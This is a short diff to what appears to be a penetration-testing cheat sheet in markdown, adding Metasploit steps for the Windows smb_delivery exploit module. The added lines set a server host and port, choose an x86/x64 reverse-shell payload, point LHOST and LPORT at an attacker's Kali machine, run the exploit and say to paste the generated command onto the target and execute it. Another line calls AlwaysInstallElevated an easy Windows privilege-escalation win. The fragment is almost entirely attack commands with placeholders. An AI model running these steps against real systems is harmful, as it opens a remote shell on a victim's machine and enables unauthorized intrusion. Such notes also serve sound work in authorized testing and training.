@@ -27,7 +27,12 @@ Note2: One of the easy win in windows with msfvenom is to check if AlwaysInstall
 ```
 use exploit/windows/smb/smb_delivery
 set SRVHOST <kali_ip>
-set PAYLOAD <
+set SRVPORT <server_port>
+set PAYLOAD <x86/x64 reverse shell>
+set LHOST <kali_ip>
+set LPORT <kali_port>
+exploit
+#paste command onto target and execute
 ```
 
 General:
